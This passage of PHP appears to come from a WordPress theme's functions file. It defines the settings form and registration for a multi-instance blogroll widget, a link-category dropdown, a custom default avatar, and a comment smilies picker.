	$showform = (int) $options[$number]['showform'];
	$orderby = htmlspecialchars($options[$number]['orderby']);
	$order = htmlspecialchars($options[$number]['order']);
	$width = (int) $options[$number]['width'];
	$height = (int) $options[$number]['height'];
	$num = (int) $options[$number]['num'];
	$nofollow = (bool) $options[$number]['nofollow'];
	$parameters = array(
		  'category' => $category,
		  'showform' => $showform,
		  'orderby' => $orderby,
		  'width' => $width,
		  'height' => $height,
		  'num' => $num,
		  'nofollow' => $nofollow,
		  'orderby' => $orderby,
		  'order' => $order
		);		

	
	echo $before_widget.$before_title.$title.$after_title;
		yg_adv_blogroll( $parameters );
	echo $after_widget;
}

// Displays form for a particular instance of the widget.  Also updates the data after a POST submit
// $widget_args: number
//    number: which of the several widgets of this type do we mean
function yg_adv_blogroll_control( $widget_args = 1 ) {
	global $wp_registered_widgets;
	static $updated = false; // Whether or not we have already updated the data after a POST submit

	if ( is_numeric($widget_args) )
		$widget_args = array( 'number' => $widget_args );
	$widget_args = wp_parse_args( $widget_args, array( 'number' => -1 ) );
	extract( $widget_args, EXTR_SKIP );

	// Data should be stored as array:  array( number => data for that instance of the widget, ... )
	$options = get_option('yg_adv_blogroll');
	if ( !is_array($options) )
		$options = array();

	// We need to update the data
	if ( !$updated && !empty($_POST['sidebar']) ) {
		// Tells us what sidebar to put the data in
		$sidebar = (string) $_POST['sidebar'];

		$sidebars_widgets = wp_get_sidebars_widgets();
		if ( isset($sidebars_widgets[$sidebar]) )
			$this_sidebar =& $sidebars_widgets[$sidebar];
		else
			$this_sidebar = array();

		foreach ( $this_sidebar as $_widget_id ) {
			// Remove all widgets of this type from the sidebar.  We'll add the new data in a second.  This makes sure we don't get any duplicate data
			// since widget ids aren't necessarily persistent across multiple updates
			if ( 'yg_adv_blogroll_widget' == $wp_registered_widgets[$_widget_id]['callback'] && isset($wp_registered_widgets[$_widget_id]['params'][0]['number']) ) {
				$widget_number = $wp_registered_widgets[$_widget_id]['params'][0]['number'];
				if ( !in_array( "adv-blogroll-$widget_number", $_POST['widget-id'] ) ) // the widget has been removed. "many-$widget_number" is "{id_base}-{widget_number}
					unset($options[$widget_number]);
			}
		}
		
		foreach ( (array) $_POST['adv-blogroll'] as $widget_number => $adv_blogroll_instance ) {
			// compile data from $widget_many_instance
			$title = wp_specialchars( $adv_blogroll_instance['title'] );
			$orderby = wp_specialchars( $adv_blogroll_instance['orderby'] );
			$order = wp_specialchars( $adv_blogroll_instance['order'] );
			$options[$widget_number] = array( 'title' => $title, 'cat' => (int) $adv_blogroll_instance['cat'], 'showform' => (int) $adv_blogroll_instance['showform'], 'orderby' => $orderby, 'order' => $order, 'width' => (int) $adv_blogroll_instance['width'], 'height' => (int) $adv_blogroll_instance['height'], 'num' => (int) $adv_blogroll_instance['num'], 'nofollow' => (bool) $adv_blogroll_instance['nofollow']  );
		}
		
		update_option('yg_adv_blogroll', $options);
		
		$updated = true; // So that we don't go through this more than once
	}

	// Here we echo out the form
	if ( -1 == $number ) { // We echo out a template for a form which can be converted to a specific form later via JS
		$title = __('Blogroll', 'advanced_blogroll');
		$cat = 0;
		$showform = 0;
		$orderby = 'name';
		$order = 'ASC';
		$width = 30;
		$height = 30;
		$num = 0;
		$nofollow = 0;
		$number = '%i%';
	} else {
		$title = attribute_escape($options[$number]['title']);
		$cat = (int) $options[$number]['cat'];
		$showform = ((int) $options[$number]['showform'] > 2 ) ? 0 : (int) $options[$number]['showform'];
		$orderby = attribute_escape($options[$number]['orderby']);
		$order = attribute_escape($options[$number]['order']);
		$width = ((int) $options[$number]['width'] < 16 ) ? 16 : (int) $options[$number]['width'];
		$height = ((int) $options[$number]['height'] < 16 ) ? 16 : (int) $options[$number]['height'];
		$num = ((int) $options[$number]['num'] < 0 ) ? 0 : (int) $options[$number]['num'];
		$nofollow = (int) $options[$number]['nofollow'];
	}
	// The form has inputs with names like widget-many[$number][something] so that all data for that instance of
	// the widget are stored in one $_POST variable: $_POST['widget-many'][$number]
?>
		<p>
		 <label for="adv-blogroll-title-<?php echo $number; ?>">
		  <?php _e( 'Title:' );?>
		  
		  <input class="widefat" id="adv-blogroll-title-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][title]" type="text" value="<?php echo $title; ?>" />
		 </label>
		</p>
		
		<p>
		 <label for="adv-blogroll-cat-<?php echo $number; ?>">
				<?php _e( 'Category:' ); ?><br />
		  <select id="adv-blogroll-cat-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][cat]">
				<?php 
				  dropdown_links_cats($cat);
				?>
		  </select>
		 </label>
		</p>
		<p>
		 <label for="adv-blogroll-orderby-<?php echo $number; ?>"><?php _e( 'Order By:', 'advanced_blogroll' ); ?><br />
		  <select id="adv-blogroll-orderby-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][orderby]">
			<option value="name" <?php echo ( $orderby == 'name' ) ? 'selected' : ''?>><?php _e('Name', 'advanced_blogroll'); ?></option>	
			<option value="id" <?php echo ( $orderby == 'id' ) ? 'selected' : ''?>><?php _e('ID', 'advanced_blogroll'); ?></option>
			<option value="url" <?php echo ( $orderby == 'url' ) ? 'selected' : ''?>><?php _e('URI', 'advanced_blogroll'); ?></option>
			<option value="rating" <?php echo ( $orderby == 'rating' ) ? 'selected' : ''?>><?php _e('Rating', 'advanced_blogroll'); ?></option>			
			<option value="rand" <?php echo ( $orderby == 'rand' ) ? 'selected' : ''?>><?php _e('Random', 'advanced_blogroll'); ?></option>
		  </select>
		 </label>
		</p>
		<p>
		 <label for="adv-blogroll-order-<?php echo $number; ?>"><?php _e( 'Order:', 'advanced_blogroll' ); ?><br />
		  <select id="adv-blogroll-order-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][order]">
			<option value="ASC" <?php echo ( $order == 'ASC' ) ? 'selected' : ''?>><?php _e('Ascending', 'advanced_blogroll'); ?></option>	
			<option value="DESC" <?php echo ( $order == 'DESC' ) ? 'selected' : ''?>><?php _e('Descending', 'advanced_blogroll'); ?></option>
		  </select>
		 </label>
		</p>		
		<p>
		 <label for="adv-blogroll-showform-<?php echo $number; ?>"><?php _e( 'Display Form:', 'advanced_blogroll' ); ?><br />
		  <select id="adv-blogroll-showform-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][showform]">
			<option value="0" <?php echo ( $showform == 0 ) ? 'selected' : ''?>><?php _e('Only Names', 'advanced_blogroll'); ?></option>	
			<option value="1" <?php echo ( $showform == 1 ) ? 'selected' : ''?>><?php _e('Only Images', 'advanced_blogroll'); ?></option>
			<option value="2" <?php echo ( $showform == 2 ) ? 'selected' : ''?>><?php _e('Images with Names', 'advanced_blogroll'); ?></option>
		  </select>
		 </label>
		</p>
		<p>
		 <label for="adv-blogroll-width-<?php echo $number; ?>"><?php _e('Image Width: ', 'advanced_blogroll'); ?>
		  <input style="width: 15%; text-align:center; padding: 3px;" id="adv-blogroll-width-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][width]" type="text" value="<?php echo $width ?>" />px
		  <br /><small><?php _e('(at least 16px)', 'advanced_blogroll'); ?></small>
		 </label>
		</p>
		<p>
		 <label for="adv-blogroll-height-<?php echo $number; ?>"><?php _e('Image Height: ','advanced_blogroll'); ?>
		  <input style="width: 15%; text-align:center; padding: 3px;" id="adv-blogroll-height-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][height]" type="text" value="<?php echo $height; ?>" />px
		  <br /><small><?php _e('(at least 16px)', 'advanced_blogroll'); ?></small>
		 </label>
		</p>
	
		<p>
		 <label for="adv-blogroll-numbookmarks-<?php echo $number; ?>"><?php _e('Number of Bookmarks to Show: ','advanced_blogroll'); ?>
		  <input style="width: 15%; text-align:center; padding: 3px;" id="adv-blogroll-numbookmarks-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][num]" type="text" value="<?php echo $num; ?>" />
		  <br /><small><?php _e('( 0 - All Bookmarks)', 'advanced_blogroll'); ?></small>
		 </label>
		</p>
		
		<p>
		 <label for="adv-blogroll-nofollow-<?php echo $number; ?>">
		  <input type="checkbox" class="checkbox" id="adv-blogroll-nofollow-<?php echo $number; ?>" name="adv-blogroll[<?php echo $number; ?>][nofollow]"<?php checked( (bool) $nofollow, true ); ?> />
		  <?php _e( 'Add rel = "nofollow" to bookmarks', 'advanced_blogroll'); ?>
		 </label>
		</p>
		
		<!--<input type="hidden" name="cat-posts[<?php echo $number; ?>][submit]" value="1" />-->
<?php

}
function dropdown_links_cats($cat) {
 //$selected = (int) $selected;
// $number = $number;
 
	$categories = get_terms('link_category', 'orderby=name&hide_empty=0');

	if ( empty($categories) )
		return;
    echo "<option value='0'";
	echo ($cat == 0) ? ' selected' : '';
	echo ">".__("All Categories")."</option>";
	foreach ( $categories as $category ) {
		$cat_id = $category->term_id;
		$name = wp_specialchars( apply_filters('the_category', $category->name));
		//echo "<option value='$cat_id'" . $cat_id==$selected ? " selected = 'selected'" : '' .">$name</option>";
		if ($cat_id != $cat)
		 echo "<option value='".$cat_id."'>".$name."</option>";
		else
		 echo "<option value='".$cat_id."' selected>".$name."</option>";		 
	}

}
// Registers each instance of our widget on startup
function yg_adv_blogroll_register() {
	if ( !$options = get_option('yg_adv_blogroll') )
		$options = array();

	$widget_ops = array('classname' => 'adv-blogroll', 'description' => __('Widget that shows your bookmarks as you want.'));
	$control_ops = array('id_base' => 'adv-blogroll');
	$name = __('鬼梦友情链接', 'advanced_blogroll');

	$registered = false;
	foreach ( array_keys($options) as $o ) {
		// Old widgets can have null values for some reason
		if ( !isset($options[$o]['cat']) ) // we used 'something' above in our exampple.  Replace with with whatever your real data are.
			continue;

		// $id should look like {$id_base}-{$o}
		$id = "adv-blogroll-$o"; // Never never never translate an id
		$registered = true;
		wp_register_sidebar_widget( $id, $name, 'yg_adv_blogroll_widget', $widget_ops, array( 'number' => $o ) );
		wp_register_widget_control( $id, $name, 'yg_adv_blogroll_control', $control_ops, array( 'number' => $o ) );
	}

	// If there are none, we register the widget's existance with a generic template
	if ( !$registered ) {
		wp_register_sidebar_widget( 'adv-blogroll-1', $name, 'yg_adv_blogroll_widget', $widget_ops, array( 'number' => -1 ) );
		wp_register_widget_control( 'adv-blogroll-1', $name, 'yg_adv_blogroll_control', $control_ops, array( 'number' => -1 ) );
	}
}

add_action('plugins_loaded', 'yg_adv_blogroll_loadlang');
function yg_adv_blogroll_loadlang() {
	load_plugin_textdomain('advanced_blogroll', 'wp-content/plugins/advanced-blogroll');
}

// This is important
add_action( 'widgets_init', 'yg_adv_blogroll_register' );

// Modifying default gravatar
add_filter( 'avatar_defaults','newgravatar' );function newgravatar ($avatar_defaults) {
$myavatar = get_bloginfo('template_directory') . '/images/ali6.jpg'; //把user-avatar.png 上传到images文件夹中
$avatar_defaults[$myavatar] = "user-avatar"; // 讨论设置选项中显示的名称
return $avatar_defaults;
}

//评论表情
function wp_smilies() {
	global $wpsmiliestrans;
	if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
	$smilies = array_unique($wpsmiliestrans);
	$link='';
	foreach ($smilies as $key => $smile) {
		$file = get_bloginfo('template_directory').'/images/smilies/'.$smile;
		$value = " ".$key." ";
		$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";
		$imglink = htmlspecialchars($img);
		$link .= "<a href=\"#commentform\" title=\"表情\" onclick=\"document.getElementById('comment-content').value += '{$value}'\">{$img}</a>&nbsp;&nbsp;&nbsp;";
		$click="return click_a('sm')";
	}
	echo '<div class="s-submit"><button onclick="'.$click.'">表情</button><ul id="sm" style="display:none;">'.$link.'</ul></div>';
}

//修改评论表情调用路径
function g_smilies_src ($img_src, $img, $siteurl){
	return get_bloginfo('template_directory').'/images/smilies/'.$img;
}
	add_filter('smilies_src','g_smilies_src',1,10); 
?>